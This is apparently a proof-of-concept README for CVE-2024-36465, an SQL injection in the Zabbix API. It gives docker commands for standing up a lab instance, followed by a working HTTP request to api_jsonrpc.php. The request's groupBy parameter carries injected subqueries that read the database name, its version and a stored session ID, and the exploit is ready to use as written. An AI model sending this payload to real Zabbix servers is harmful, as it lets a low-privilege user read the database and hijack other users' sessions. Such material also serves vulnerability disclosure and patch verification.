# CVE-2024-36465-Poc

## SQL injection in Zabbix API (CVE-2024-36465)

### Description
A low privilege (regular) Zabbix user with API access can use SQL injection vulnerability in include/classes/api/CApiService.php to execute arbitrary SQL commands via the groupBy parameter.

### Link
https://support.zabbix.com/browse/ZBX-26257

### Build:
Link: https://wiki.nhanhoa.com/kb/zabbix-cai-dat-zabbix-7-0-server-bang-docker-container/

Step 1: 
``` 
docker pull tudv1989/zabbix70:latest
```
Step 2:
```
docker run -itd --name=zabbix --restart always -p 80:80 -p 10051:10051 -e DBNAME=zabbixdb -e DBUSER=zabbix_username -e DBPASSWD=zabbix_password tudv1989/zabbix70
```


# Poc

```
POST /api_jsonrpc.php HTTP/1.1
Host: <Host>
Authorization: Bearer {{hash}}
Content-Length: 240
Content-Type: application/json;charset=UTF-8

{
 "jsonrpc": "2.0",
    "method": "item.get",
    "params": {
        "output": ["itemid", "name"],
        "groupBy": ["hostid,(select database()),(select version()),(SELECT sessionid FROM sessions LIMIT 0,1)"]
    },
    "id":0
}

```
![image](https://github.com/user-attachments/assets/f4543415-fc6e-4e13-860c-481c89b2c58d)
